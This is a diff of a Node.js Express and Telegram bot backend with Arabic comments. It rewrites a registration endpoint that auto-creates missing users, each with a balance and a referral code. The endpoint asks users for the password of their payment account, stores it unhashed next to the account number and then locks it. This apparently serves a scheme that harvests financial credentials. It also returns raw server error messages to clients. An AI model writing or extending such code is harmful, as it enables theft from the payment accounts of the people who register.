@@ -70,21 +70,48 @@ app.get('/api/user/:id', async (req, res) => {
 
 // 2. تحديث البيانات (التسجيل)
 app.post('/api/register', async (req, res) => {
-    const { userId, fullName, phone, address, method, account, pass } = req.body;
-    const user = await User.findOne({ id: userId });
-    
-    if (user.paymentLocked) return res.json({ error: "بياناتك محفوظة ولا يمكن تعديلها" });
+    try {
+        const { userId, fullName, phone, address, method, account, pass } = req.body;
+        
+        console.log("Registering user:", userId); // تسجيل في السجلات للمراقبة
 
-    user.fullName = fullName;
-    user.phone = phone;
-    user.address = address;
-    user.paymentMethod = method;
-    user.paymentAccount = account;
-    user.paymentPassword = pass;
-    user.paymentLocked = true; // قفل البيانات
-    
-    await user.save();
-    res.json({ success: true });
+        // محاولة العثور على المستخدم
+        let user = await User.findOne({ id: userId });
+        
+        // ⚠️ الإصلاح هنا: إذا لم يوجد المستخدم، قم بإنشائه فوراً
+        if (!user) {
+            console.log("User not found, creating new one...");
+            user = await User.create({
+                id: userId,
+                name: fullName, // استخدام الاسم المدخل
+                refCode: userId,
+                balance: 0.0
+            });
+        }
+
+        // التحقق من القفل
+        if (user.paymentLocked) {
+            return res.json({ success: false, error: "تم تسجيل بياناتك مسبقاً ولا يمكن تعديلها" });
+        }
+
+        // تحديث البيانات
+        user.fullName = fullName;
+        user.phone = phone;
+        user.address = address;
+        user.paymentMethod = method;
+        user.paymentAccount = account;
+        user.paymentPassword = pass;
+        user.paymentLocked = true; // قفل البيانات لمنع التغيير
+        
+        await user.save();
+        console.log("User registered successfully");
+        
+        res.json({ success: true });
+
+    } catch (e) {
+        console.error("Register Error:", e);
+        res.status(500).json({ success: false, error: "خطأ داخلي في السيرفر: " + e.message });
+    }
 });
 
 // 3. جلب المهام
@@ -173,4 +200,5 @@ bot.start(async (ctx) => {
 });
 
 bot.launch();
+
 
